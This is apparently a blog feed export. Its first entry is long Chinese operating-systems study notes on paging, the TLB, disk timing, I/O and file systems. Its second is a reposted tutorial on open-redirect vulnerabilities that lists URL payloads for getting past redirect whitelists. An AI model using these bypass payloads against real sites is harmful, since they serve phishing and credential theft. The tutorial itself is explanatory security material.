/取数据时，根据数据所在的<strong>逻辑页号</strong>在快表中找到其对应的内存块号，再联系页内地址，形成物理地址。</p><p>如果在快表中没有相应的逻辑页号，则地址映射仍可以通过内存中的页表进行，得到对应/空闲块号后必须将该块号填入快表的空闲块中。如果快表中没有空闲块，则根据淘汰算法淘汰某一行，再填入新的页号和块号。</p><p>快表查找内存块的物理地址消耗的时间大大降低了，使得系统效率得到了极大的提高。</p><p><strong><em>高速缓冲存储器(Cache)</em> —- Cache 在 CPU中运用的典型范例</strong></p><p>高速缓冲存储器（Cache）是位于 CPU与内存之间的临时存储器，它的容量比内存小但交换速度快。在 Cache中的数据是内存中的一小部分，但这一小部分是段时间内 CPU 即将访问的。当CPU 调用大量数据时，就可避开内存直接从 Cache中调用，从而加快读取速度。由此可见，在 CPU 加入 Cache是一种高效的解决方案，这样整个内存储器（Cache + 内存）就变成了既有 Cache的高速度又有内存的大容量的存储系统了。Cache 对 CPU性能的影响很大，这主要是由 CPU 的数据交换顺序和 CPU 与 Cache间的带宽引起的。</p><p>cpu 缓存是集成于 cpu中的双极性的高速存储阵列（比内存要快很多），作用是用来加速 cpu对高频数据的访问来提高系统性能。</p></li><li><p>内存访问次数 / 时间</p></li><li><p>虚拟页式存储系统</p><p>快表是一种特殊的高速缓冲存储器（Cache），内容是页表中的一部分或全部内容。 [1]</p><p>在操作系统中引入快表是为了加快地址映射速度。</p><p>在虚拟页式存储管理中设置了快表，作为当前进程页表的Cache。通常快表处于 MMU 中。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728215555.png"alt="tlb" /><figcaption aria-hidden="true">tlb</figcaption></figure></li><li><p>段页式系统</p><p>在没有缓存段表和页表的情况下，为了<strong>获得一条指令或数据，须三次访问内存</strong>。</p><p>1. 第一次访问是<strong>访问内存中的段表</strong>，从中取得页表始址；</p><p>2. 第二次访问是<strong>访问内存中的页表</strong>，从中取出该页所在的物理块号，并将该块号与页内地址一起形成指令或数据的物理地址；</p><p>3. 第三次访问才是真正从第二次访问所得的地址中，<strong>取出指令或数据</strong></p><p>当已经缓存了段表或页表时，前两次访存过程可以跳过，直接从缓存可取段表或页表，最后进行第三步：去内存取指令和数据。</p><p>所以至多三次，至少一次。</p><p>例题：</p></li><li><p>分页存储系统内存有效访问时间</p><p><ahref="https://blog.csdn.net/yangkuiwu/article/details/53996900">有效访问时间</a></p></li><li><p><ahref="https://wenku.baidu.com/view/601c5f0159fafab069dc5022aaea998fcc224023.html?re=view">操作系统第5 章习题带答案</a></p><blockquote><p>在一个具有快表的虚拟页式内存系统中，快表的命中率为95%，指令和数据的缓存命中率为 75%；访问快表和缓存的时间为10ns，更新一次快表的时间为 10μs，更新一个缓存块的时间为20μs。请计算，每条指令的有效访问时间是多少？</p></blockquote><p>分为两个步骤：查找页表 和 查找数据和指令</p><p>第一步：查找页表</p><p>如果快表命中：10ns</p><p>如果快表未命中：10ns + 10 us</p><p>第二步：查找指令和数据</p><p>如果指令和数据的缓存命中：10 ns</p><p>如果指令和数据的缓存未命中：10ns + 20 us</p><p>综上：</p><p><code>95%*10 ns + 5%(10ns + 10 us) + 75%*10ns + 25%( 10ns + 20 us )</code></p><p>秒换算</p><p>1 秒(s) ＝ 1000 毫秒(ms)</p><p>1 毫秒(ms)＝ 1000 微秒 (us)</p><p>1 微秒(us)＝ 1000 纳秒 (ns)</p><p>1 纳秒(ns)＝ 1000 皮秒 (ps)</p></li></ol></li></ol><h4 id="动态分区">动态分区</h4><ol type="1"><li><p>首次适配</p><p>首次适配算法不仅是最简单的，而且通常也是最快和最好的。</p></li><li><p>循环适配 / 下次适配</p></li><li><p>最佳适配</p><p>最佳适配通常性能是最差的，与其他算法相比，它需要更频繁地进行内存压缩。</p></li><li><p>最差适配</p><p>通常情况下，从好到坏：首次适配 ≥ 循环适配 ≥ 最佳适配。</p><p>对内存的利用率从高到低：同上。</p><p>优缺点见课本 p210</p></li></ol><h4 id="驻留集">驻留集</h4><p>对于分页式虚拟内存，在准备执行时，操作系统决定读取的该进程的页数，即：决定给特定的进程分配的空间大小（分配的页框个数）。例如：驻留集大小为2， 则为该进程分配 2 个页框。</p><ol type="1"><li><p>在请求分页存储管理中，从主存刚刚移走某一页面后，根据请求又马上调入该页，这种反复调进调出的现象，称为系统颠簸，也叫系统抖动。</p></li><li><p>可能出现 "抖动"的存储管理方式：请求分页存储管理、请求段式存储管理、请求段页式存储管理。</p><p>可能出现抖动的，就是存在页面换入换出的，那当然就是虚拟内存中的请求xxx 存储管理了。</p></li></ol><h2 id="设备管理">设备管理</h2><p>设备独立性，即应用程序独立于具体使用的物理设备。</p><p>为了实现设备独立性而引入了逻辑设备和物理设备这两个概念。</p><h2 id="磁盘">磁盘</h2><h3 id="术语">术语</h3><p>盘片被分成许多扇形的区域,每个区域叫一个扇区。</p><p>盘片表面上以盘片中心为圆心,不同半径的同心圆称为磁道。</p><p>硬盘中,不同盘片相同半径的磁道所组成的圆柱称为柱面。</p><p>磁道与柱面都是表示不同半径的圆,磁盘的柱面数与一个盘面上的磁道数是相等的，在许多场合,磁道和柱面可以互换使用。</p><p>每个磁盘有两个面,每个面都有一个磁头,习惯用磁头号来区分，盘面数等于总的磁头数。扇区,磁道(或柱面)和磁头数构成了硬盘结构的基本参数。</p><p>这些参数可以得到硬盘的容量,计算公式为:存储容量=磁头数 × 磁道(柱面)数× 每道扇区数 × 每扇区字节数</p><h3 id="平均磁盘访问时间">平均磁盘访问时间</h3><p>存取时间 = 寻道时间 + 旋转延时</p><p>平均磁盘访问时间 = 平均寻道时间 + 平均旋转延时 + 传输时间 +控制器延时</p><p>平均旋转延时 = 旋转一周时间的一半( 平均嘛，就是 * 1/2)</p><p>旋转延迟中，最多旋转１圈，最少不用旋转，平均情况下，需要旋转半圈，所以要除2，问题就解决了。</p><p>如果没有说磁盘传输速度，说了每个磁道的扇区个数，可以用 周期/每个磁道的扇区个数 来代替一个扇区的传输时间。</p><p>例题一：</p><blockquote><p>某磁盘的转速为 10 000 转/分，平均寻道时间是 6 ms，磁盘传输速率是 20MB/s， 磁盘控制器延迟为 0.2 ms，读取一个 4 KB 的扇区所需的平均时间约（）。</p></blockquote><p>解析：</p><blockquote><p>根据公式：平均磁盘访问时间 = 平均寻道时间 + 平均旋转延时 + 传输时间 +控制器延时 平均寻道时间：6ms 平均旋转延迟：3ms 10000 转/分 =&gt;1min/10000 转 = 6ms/转 =&gt; 3ms/转 传输时间：0.2ms<code>4KB/20MB/s = （0.2 * 2^(-10)）约= （0.2 * 10^(-3)）= 0.2ms</code>控制器延迟：0.2ms 故读取一个 4KB 的扇区所需时间为：6ms+3ms+0.2ms+0.2ms =9.4ms</p></blockquote><p>例题二：</p><blockquote><p>若磁盘转速为 7200 转/分，平均寻道时间为 8ms,每个磁道包含 1000个扇区，则访问一个扇区的平均延迟时间大约是（）。</p></blockquote><p>解析：</p><blockquote><p>存取时间 = 寻道时间 + 延迟时间 +传输时间。存取一个扇区的平均延迟时间为旋转半周的时间，即为(60/7200)/2=4.17ms ，传输时间为 (60/7200)/1000=0.01ms，因此访问一个扇区的平均存取时间为 4.17+0.01+8=12.18ms，保留一位小数则为 12.2ms 。</p></blockquote><p>例题三：</p><blockquote><p>某磁盘每条磁道可存储 10MB 数据，转速为 7200 rpm， 则读取 3MB数据的传输时间为 2.5 ms。</p></blockquote><p>解析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; In [<span class="number">17</span>]: （3MB/10MB） * <span class="number">60</span>/<span class="number">7200</span></span><br><span class="line">&gt; Out[<span class="number">17</span>]: <span class="number">0.0025</span></span><br></pre></td></tr></table></figure><h4 id="磁盘分配算法">磁盘分配算法</h4><p>根据磁盘的操作时间，对磁盘调度分为：移臂调度、旋转调度两部分组成。</p><ol type="1"><li><p>移臂调度算法</p><ul><li><p>先来先服务（FIFO / FCFS）</p></li><li><p>最短寻找时间优先/ 最短服务时间优先（SSTF）</p><p>选择使磁头臂从当前位置开始移动最少的 IO 请求。</p></li><li><p>电梯调度算法（SCAN 算法）</p><p>从移动臂当前位置开始沿着臂的移动方向去选择离当前移动臂最近的那个柱面的访问者，如果沿臂的移动方向无请求访问时，就改变臂的移动方向（掉头）再选择。</p></li><li><p>单向扫描算法（CSCAN，循环 SCAN）</p><p>当访问到沿某个方向的最后一个磁道时，磁头臂返回到磁盘相反方向末端的磁道，并再次开始扫描。</p><p>SCAN 算法 与 CSCAN 算法</p><p>相同点：最开始都是从当前位置，向移动方向走。</p><p>不同点：到了某个方向的最后一个要访问的磁道之后，前者在当前位置掉头往后走，后者，去到反方向的末端，再开始该方向扫描。</p><p>当移动臂定位后，应该优先选择延迟时间最短的访问者去执行，根据延迟时间来决定执行次序的调度称为旋转调度。</p></li></ul></li></ol><h3 id="io-缓冲">IO 缓冲</h3><h3 id="io-缓冲方式">I/O 缓冲方式</h3><ol type="1"><li><p>单缓冲</p></li><li><p>双缓冲</p></li><li><p>循环缓冲</p><blockquote><p>假设一个计算进程的生命周期为 1 小时，I/O 设备写一个缓冲区需要10S，计算进程每隔 6S读一个缓冲区（读缓冲的时间忽略不计）。如果采取预先写缓冲的方式，缓冲区管理采取循环缓冲，要求计算进程不能因为读缓冲区而被阻塞，那么循环缓冲中至少应该有多少个缓冲区？</p></blockquote><p>解析</p><blockquote><p>由于要求进程（在生命周期内）不能因读缓冲区被阻塞。因此，在 1小时内，存在下列条件：读的缓冲区个数 ≤写的缓冲区个数（当然，要包括预先写的缓冲）。</p></blockquote><p>计算如下：</p><blockquote><p>预备：1 h =3600 s，可以写 ： 3600 / 10 = 360 个缓冲区。可以读 3600/6= 600 个缓冲区。又因为预缓冲，所以一开始缓冲区都是满的。 故：600 ≤ 360 +n, 所以：至少应有 240 个缓冲区。</p></blockquote></li><li><p>缓冲池</p></li><li><p>SPOOLing 技术</p><p>目的：将一台物理 I／O 设备虚拟为多台逻辑 I／O设备，同样允许多个用户共享一台物理 I／O 设备。</p><p>在联机情况下实现的同时外围操作称为 SPOOLine， SPOOling 技术</p><p>特点：</p><p>（1）提高了 I／O 的速度。缓和了 CPU 与低速 I／O设备之间速度不匹配的矛盾。</p><p>（2）将独占设备改造为共享设备。</p><p>（3）实现了虚拟设备功能</p><p>SPOOLing技术通过把独占设备改造成共享设备，从而提高独占设备的利用率</p></li><li><p>操作系统中采用缓冲技术的目的是为了增强系统并行操作的能力。</p><p>为了提高 CPU 和设备之间的并行程度。</p></li><li><p>操作系统采用缓冲技术，能够减少对 CPU的中断次数，从而提高资源的利用率。</p></li><li><p>在设备 I/O 中引入缓存技术是为了改善 CPU 与设备 I/O直接速度不匹配的矛盾。</p></li><li><p>IO 软件层次从上到下依次为: 用户级 IO软件，与设备无关的操作系统软件，设备驱动程序，中断处理程序，硬件。</p><p>因此，用户程序发出磁盘 IO 请求后，系统的正确处理流程是：</p><p>用户程序 → 系统调用程序 → 设备驱动程序 → 中断处理程序（ →硬件）</p></li><li><p>在操作系统中，用户在使用 I/O 设备时，通常采用逻辑设备名</p><p>用户程序提出使用设备申请时，使用系统规定的设备类型号和自己规定的设备相对号（即逻辑设备名）由操作系统进行地址转换，变成系统的设备绝对号（物理设备号）。</p></li><li><p><a href="https://www.jianshu.com/p/9f39c992b804">I/O控制方式</a></p><p>前三种为操作系统中常见的 I/O 控制方式</p><ol type="1"><li><p>程序直接控制</p><ol type="1"><li><p>CPU 干预频率：很频繁，I/O 操作开始之前、完成之后需要需要 CPU介入，<strong>并且在等待 I/O 完成的过程中需要 CPU不断轮询检查。</strong></p></li><li><p>数据的传送单位：每次读/写一个字。</p></li><li><p>数据流向   读操作（数据输入）：I/O 设备—&gt;CPU—&gt;内存  写操作（数据输出）：内存—&gt;CPU—&gt;I/O 设备   每个字的读/写都需要 CPU的帮忙。</p></li><li><p>主要优缺点</p></li></ol><p>优点：实现简单。在读/写指令之后，加上实现循环检查的一系列指令即可（因此才称为“程序直接控制方式”）。</p><p>缺点：<strong>CPU 和 I/O 设备只能串行工作，CPU需要一直轮询检查，长期处于"忙等"状态，CPU 利用率低。</strong></p></li><li><p>中断驱动 IO</p><ol type="1"><li><p>CPU 干预频率：每次 I/O 操作开始之前、完成之后需要需要 CPU介入，<strong>等待 I/O 完成的过程中 CPU可以切换到别的进程执行</strong>。</p></li><li><p>数据的传送单位：每次读/写一个字。</p></li><li><p>数据流向   读操作（数据输入）：I/O 设备—&gt;CPU—&gt;内存  写操作（数据输出）：内存—&gt;CPU—&gt;I/O 设备</p></li><li><p>主要优缺点</p></li></ol><p>优点：与“程序直接控制方式相比”，在“中断驱动方式”中，I/O控制器会通过中断信号主动报告 I/O 已完成，CPU不再需要不停的轮序。<strong>CPU 可以和 I/O 设备并行工作</strong>，CPU利用效率明显提升。</p><p>缺点：每个字在 I/O 设备和内存之间传输，都需要经过CPU。而<strong>频繁的中断处理会消耗较多的 CPU 时间。</strong></p><p>程序控制 IO 和中断驱动 IO ，他们的数据传输过程都需要经过CPU。且他们二者的数据传送均以字（word）为单位。</p></li><li><p>直接存储器访问 DMA</p><p>DMA 控制的寄存器及作用：</p><ol type="1"><li><p>数据寄存器（<strong>DR</strong>，DataRegister）：暂存从设备到内存，或者从内存到设备的数据。</p></li><li><p>内存地址寄存器（<strong>MAR</strong>，Memory AddressRegister）：在设备向内存输入数据时，MAR表示输入的数据应该存放到内存的什么位置，在内存向设备输出数据时，MAR表示要输出的数据放在内存的什么位置。</p></li><li><p>数据计数器（<strong>DC</strong>，DataCounter）：表示剩余要读/写的字节数。</p></li><li><p>命令/状态寄存器（<strong>CR</strong>，CommandRegister）：用于存放 CPU 发来的 I/O 命令，或设备的状态信息。</p></li><li><p>CPU 干预频率：仅在传送一个或多个数据块开始和结束时，才需要 CPU干预。</p></li><li><p>数据的传送单位：每次读/写<strong>一个或多个块。（注：每次读写的只能是连续的多个块，且这些块读入内存后在内存中也必须是连续的）</strong></p></li><li><p>数据流向（<strong>不再需要经过 CPU</strong>） 读操作（数据输入）：I/O 设备—&gt;内存   写操作（数据输出）：内存—&gt;I/O设备</p></li><li><p>主要优缺点</p></li></ol><p>优点：数据传输以 “块” 为单位，CPU介入的频率进一步降低。数据的传输不再需要先经过 CPU再写入内存，数据传输效率进一步增加，CPU 和 I/O设备的并行性能得到提升。</p><p>缺点：CPU 每发出一条 I/O指令，只能读/写一个或多个<strong>连续的数据块</strong>。如果要读/写多个离散的块，或者要将数据分别写到不同的内存区域时，CPU要分别发出多条 I/O 指令，进行多次中断操作。</p><p>采用直接存取法来读写磁盘上的物理记录时，效率最高的是连续结构的文件</p></li><li><p>所谓虚拟存储器：是指具有请求调入功能和置换功能，能从逻辑上对内存容量加以扩充的一种存储器系统，其逻辑容量由内存容量和外存容量之和所决定，其运行速度接近于内存速度，而每位的成本却又接近于外存。</p><p>引入和使用虚拟存储器的主要目的提高系统的内存利用率。</p></li><li><p><strong>虚拟存储的实现</strong></p><ul><li>请求分页存储管理方式</li><li>请求分段系统</li></ul></li><li><p>IO 通道</p><p>IO 通道的类型</p><ol type="1"><li>字节多路通道</li><li>数组选择通道</li><li>数组多路通道</li></ol><p>[通道]](https://raw.githubusercontent.com/violetu/blogimages/master/20200728220317.png)</p><blockquote><ol type="1"><li>通道和 CPU的区别在于：通道能识别的指令单一，通道没有自己的内存，需要和 CPU共享内存(通道程序：保存在主存中)。所以说可以把通道看作“低配版的CPU”。</li><li>通道和 DMA 方式的区别：DMA 方式需要 CPU来控制传输的数据块的大小、传输的位置，而通道方式中的这些信息是由通道控制的。另外，每个DMA控制器对应一台设备与内存传递数据，而一个通道可以控制多台设备与内存数据交换。</li></ol></blockquote><p>通道控制方式分析：</p><blockquote><ol type="1"><li>CPU 干预频率：极低，通道会根据 CPU的指示执行相应的通道程序，只有完成一组数据块的读/写后才需要发出中断信号，请求CPU 干预。</li><li>数据的传送单位：每次读/写一组块。</li><li>数据流向（不再需要经过 CPU）    读操作（数据输入）：I/O设备—&gt;内存    写操作（数据输出）：内存—&gt;I/O 设备</li><li>主要优缺点    优点：CPU、通道、I/O 设备可并行工作，资源利用率很高。   缺点：实现复杂，需要专门的硬件支持。</li></ol></blockquote><p>需要 CPU 干预频率从多到少：程序控制 IO → 中断驱动 IO → 直接存储器访问→ IO 通道 → 外围处理机</p><p>通道是一种 I/O 专用处理机。</p><p>计算机系统中能够独立完成输入输出操作的硬件装置，也称为“输入输出处理机”，能接收中央处理机的命令，独立执行通道程序，协助中央处理机控制与管理外部设备。一个独立于CPU 的专门 I/O 控制的处理机，控制设备与内存直接进行数据交换。</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220408.png"alt="IO ctl" /><figcaption aria-hidden="true">IO ctl</figcaption></figure></li></ol></li></ol><h2 id="文件系统">文件系统</h2><ol type="1"><li><p>文件系统的主要目的是实现对文件的按名存取</p></li><li><p>文件的存储管理实际上是对外存的管理。</p></li><li><p>按文件的逻辑结构可分为有结构文件（记录式文件）和无结构文件（流式文件）。而UNIX、DOS、WINDOWS 系统中的普通文件都是流式文件。</p><p>Windows 和 Unix 这种系统则把结构化留给应用程序。 Windows 和 UNIX提供了低级文件系统。</p></li><li><p>从对文件信息的存取次序考虑，存取方法可分为：顺序存取和随机存取两种。磁带上的文件只能顺序存取，磁盘上的文件既可采用顺序方式也可用随机方式存取。</p></li><li><p>文件的分类</p><ol type="1"><li>按用途：系统文件、用户文件、库文件</li><li>源文件、目标文件、可执行文件</li><li>按保护级：只读、读写、执行</li><li>普通文件、目录文件、特殊文件</li></ol></li><li><p>文件的大小不只受磁盘容量的限制，还受文件系统格式、文件存储结构等的限制。</p></li><li><p>文件目录是文件控制块的有序集合，而目录文件（即：目录也是文件）是为了实现对文件目录的管理，通常把文件目录以文件形式保存在外存。</p></li><li><p>从物理结构的优缺点</p><ol type="1"><li><p>顺序结构 优点 1、简单：存储与管理都简单，且容易实现。2、支持顺序存取和随机存取。 3、顺序存取速度快。4、所需的磁盘寻道次数和寻道时间最少。 缺点1、需要为每个文件预留若干物理块以满足文件增长的部分需要。2、不利于文件插入和删除。</p></li><li><p>链式结构 优点1、提高了磁盘空间利用率(提高了存储空间的利用率)，不需要为每个文件预留物理块。2、有利于文件插入和删除。 3、有利于文件动态扩充。</p><p>4、在顺序读取时效率较高, 但需要随机存取时效率低下 缺点1、存取速度慢，不适于随机存取。2、当物理块间的连接指针出错时，数据丢失。可靠性低3、更多的寻道次数和寻道时间。4、链接指针占用一定的空间，降低了空间利用率。</p></li><li><p>索引结构 优点 1、不需要为每个文件预留物理块。2、既能顺序存取，又能随机存取。 3、满足了文件动态增长、插入删除的要求。缺点 1、较多的寻道次数和寻道时间。2、索引表本身带来了系统开销。如：内外存空间，存取时间等</p><p>适合随机存取：连续结构、索引结构</p><p>易于文件扩展：链式结构、索引结构</p><p>适合随机存取且文件扩展的：索引结构</p><p>索引文件的优点：允许文件动态修改，可直接对文件进行存取</p></li></ol></li><li><p>从系统角度看，文件系统是一个负责文件存储空间的管理机构，文件管理实际是对辅助存储空间的管理。</p></li><li><p>对顺序文件进行检索时，首先从 FCB中读出文件的第一个盘块号；而对索引文件进行检索时，应先从 FCB中读出文件索引表始址。</p></li><li><p>下面这句话是错误的：顺序文件适于建立在顺序存储设备上，而不适合建立在磁盘上。</p><p>错误原因：</p><p>顺序文件存放在多路存储设备(如磁盘)上时，在多道程序的情况下，由于别的用户可能驱使磁头移向其它柱面，会降低连续存取的速度。顺序文件多用于磁带。</p><p>顺序文件不太适合存储在磁盘上并不是因为它不是顺序存储设备（他是半顺序存储），而是多道程序的事情。</p></li><li><p>顺序文件必须采用连续分配方式，而链接文件和索引文件则都可采取离散分配方式。</p></li><li><p>一个采用二级索引文件系统，存取一块盘块信息通常要访问 3次磁盘。</p></li><li><p>文件目录项 / 文件控制块 ( FCB )是系统管理文件的必须信息结构，是文件存在的唯一标志，打开文件把文件目录项( FCB ) 从磁盘拷贝到内存。</p></li><li><p>设当前工作目录的主要目的是加快文件的索引速度</p></li><li><p>视频文件属于有结构文件中的定长记录文件，适合用连续分配来组织，连续分配的优点主要有顺序访问容易，顺序访问速度快。为了实现快速随机播放，要保证最短时间查询，不宜选取链式和索引结构。</p></li><li><p>Linux 软连接与硬链接</p><p>通过文件名打开</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220539.png"alt="filename_open" /><figcaption aria-hidden="true">filename_open</figcaption></figure><p>软连接与硬链接</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728220610.png"alt="hard_soft_principle" /><figcaption aria-hidden="true">hard_soft_principle</figcaption></figure><p>硬链接</p><p>硬链接是有着相同 inode号仅文件名不同的文件，因此硬链接存在以下几点特性：</p><ul><li>文件有相同的 inode 及 data block；</li><li>只能对已存在的文件进行创建；</li><li>不能交叉文件系统进行硬链接的创建；</li><li>不能对目录进行创建，只可对文件创建；</li><li>删除一个硬链接文件并不影响其他有相同 inode 号的文件。</li></ul><p>软链接</p><p>软链接与硬链接不同，若文件用户数据块中存放的内容是另一文件的路径名的指向，则该文件就是软连接。软链接就是一个普通文件，只是数据块内容有点特殊。软链接有着自己的inode 号以及用户数据块（见 <ahref="https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html#fig2">图2.</a>）。因此软链接的创建与使用没有类似硬链接的诸多限制：</p><ul><li>软链接有自己的文件属性及权限等；</li><li>可对不存在的文件或目录创建软链接；</li><li>软链接可交叉文件系统；</li><li>软链接可对文件或目录创建；</li><li>创建软链接时，链接计数 i_nlink直接复制，不会增加；且删除原文件，软连接文件的链接计数不变。（因为链接计数是针对inode 的，而软连接有自己的文件属性、inode。）</li><li>删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接被称为死链接（若被指向路径文件被重新创建，死链接可恢复为正常的软链接）。</li></ul></li><li><p>相对目录</p><p>../ 表示当前目录上一级 ../../ 表示当前目录上一级的上一级 以此类推</p><p>./  表示当前目录</p></li><li><p>若文件的索引节点已在内存中，问访问某个文件中某个位置的内容，需要访问的磁盘次数。分情况。</p><ol type="1"><li>当要访问的文件位于直接地址时</li><li>当要访问的文件位于一级间接地址时</li><li>当要访问的文件位于二级间接地址时</li></ol></li><li><p>文件索引，问访问磁盘的个数/次数，不需要转换地址，只需要判断处于：直接索引、一级索引，还是二级索引就可以。直接比较地址的大小。</p></li><li><p>缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。</p><p>因此，如果题目中没有指出：“开始的 n 个页面已经装入内存”，那么开始将页面调入主存的那几次也是缺页中断。</p><p>缺页率 = 缺页中断次数 / 访问页面总次数（页面序列的长度）</p></li></ol><h2 id="杂项">杂项</h2><ol type="1"><li><p><strong>对程序进行重定位的技术按重定位的时机可分为两种：静态重定位和动态重定位。</strong></p><p><strong>静态重定位：</strong></p><p><strong>是在目标程序装入内存时，由装入程序对目标程序中的指令和数据的地址进行修改，即把程序的逻辑地址都改成实际的地址。对每个程序来说，这种地址变换只是在装入时一次完成，在程序运行期间不再进行重定位。</strong></p><blockquote><p>因此，静态重定位后，不可能使用紧缩技术解决碎片问题。</p></blockquote><p><strong>优点：是无需增加硬件地址转换机构，便于实现程序的静态连接。在早期计算机系统中大多采用这种方案。</strong></p><p><strong>缺点：（1）程序的存储空间只能是连续的一片区域，而且在重定位之后就不能再移动。这不利于内存空间的有效使用。（2）各个用户进程很难共享内存中的同一程序的副本。</strong></p><p><strong>动态重定位：</strong></p><p><strong>是在程序执行期间每次访问内存之前进行重定位。这种变换是靠硬件地址变换机构实现的。通常采用一个重定位寄存器，其中放有当前正在执行的程序在内存空间中的起始地址，而地址空间中的代码在装入过程中不发生变化。</strong></p><p><strong>优点：（1）程序占用的内存空间动态可变，不必连续存放在一处。（2）比较容易实现几个进程对同一程序副本的共享使用。</strong></p><p><strong>缺点：是需要附加的硬件支持，增加了机器成本，而且实现存储管理的软件算法比较复杂。</strong></p><p><strong>现在一般计算机系统中都采用动态重定位方法。</strong></p><p>动态重定位在装入作业时，不进行地址转换。</p></li><li><p>地址重定位指的是：</p><ol type="1"><li>作业地址空间和物理地址空间的映射；</li><li>将作业的逻辑地址变换为主存的物理地址；</li><li>将作业的相对地址变换为主存的绝对地址。</li></ol></li><li><p>实时系统的基本特征：（多 交 可 及 独）</p><p>多路性、交互性、可靠性、及时性、独立性</p></li><li><p>系统调用是操作系统提供给编程人员的唯一接口。</p><p>程序接口又称应用编程接口，程序接口由一组系统调用（systemcall）组成，获得操作系统的底层服务，使用或访问系统管理的各种软硬件资源</p></li><li><p>与硬件有关的操作及过程</p><ol type="1"><li>页表机制</li><li>地址变换机构</li><li>缺页中断机构</li><li>时钟管理</li></ol></li><li><p>现代操作系统具有并发性、共享性、虚拟性、异步性。</p><p>异步性：在多道程序环境下，程序执行过程的不确定性。</p></li><li><p>中断类型分为如下两大类：</p><p>一、强迫性中断：正在运行的程序所不期望的，来自硬件故障或外部请求。</p><p>1、I/O 中断：来自外部设备通道；</p><p>2、程序性中断：运行程序本身的中断，如溢出、缺页中断、缺段中断、地址越界。</p><p>3、时钟中断</p><p>4、控制台中断</p><p>5、硬件故障</p><p>二、自愿性中断：用户在编程时要求操作系统提供的服务，使用访管指令或系统调用使中断发生。也称为访管中断。包括执行I/O，创建进程，分配内存，信号量操作，发送/接收消息</p></li><li><p>在单处理器系统中，如果同时存在有 12个进程，则处于就绪队列中的进程数量最多为 11。</p><p>如果双核处理系统中的话，处于就绪队列中的进程数量最多为 10。</p><p>就绪队列中最多的进程数 = 总进程数 - 核数</p></li><li><p>从用户的观点看，操作系统是用户与计算机硬件之间的接口。</p></li><li><p>用户与操作系统的接口可以是：</p><ol type="1"><li>系统调用</li><li>命令解释与键盘命令</li><li>联机或交互式用户的接口、</li><li>内外部命令</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL 重定向（转载）</title>
      <link href="/blog/2019/11/23/websec/url_redirect(repost)/"/>
      <url>/blog/2019/11/23/websec/url_redirect(repost)/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述">漏洞描述</h2><p>服务端未对传入的跳转 URL变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss 漏洞</p><h2 id="漏洞检测">漏洞检测</h2><p>修改参数中的合法 URL 为非法URL，然后查看是否能正常跳转或者响应包是否包含了任意的构造 URL</p><h2 id="绕过-url-跳转限制">绕过 URL 跳转限制</h2><h3 id="利用问号绕过限制">利用问号绕过限制</h3><p>比如：<code>http://www.aaa.com/acb?Url=http://login.aaa.com</code>这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：<code>http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</code>。那么，它其实是会跳转到这个 <code>test.com</code>域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：<code>http://www.test.com/?login.aaa.com</code></p><h3 id="利用反斜杠和正斜杠绕过限制">利用反斜杠和正斜杠绕过限制</h3><p>比如：<code>http://www.aaa.com/acb?Url=http://login.aaa.com/</code>同样是在它本身域名前加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址如：<code>http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</code></p><p>反斜杠有三种思路 (1)两个反斜杠绕过方法比如：<code>http://www.aaa.com/acb?Url=http://login.aaa.com/</code>同样是在它本身域名前加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址如：<code>http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com</code>(2)一个反斜杠绕过方法如：<code>http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</code>(3)另一种思路，一个反斜杠一个点利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，如：<code>http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com</code></p><h3 id="利用绕过-url-限制">利用@绕过 URL 限制</h3><p>如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。如：http://www.aaa.com/acb?Url=http://login.aaa.com@test.com后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的</p><h3 id="利用号绕过">利用#号绕过</h3><p>如：http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</p><h3 id="利用白名单缺陷绕过限制">利用白名单缺陷绕过限制</h3><p>有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧，为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：http://www.aaa.com/acb?Url=http://login.aaa.com，这个login.aaa.com 也可以改成 aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com ，白名单里会检查是否包含 aaa.com这个域名，包含，然后直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com 这个域名就可以利用这个跳转。</p><h3 id="多重验证跳转绕过限制">多重验证&amp;跳转绕过限制</h3><p>现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL 很可能存在任意跳转的问题。 多重跳转的问题导致可绕过 URL 限制 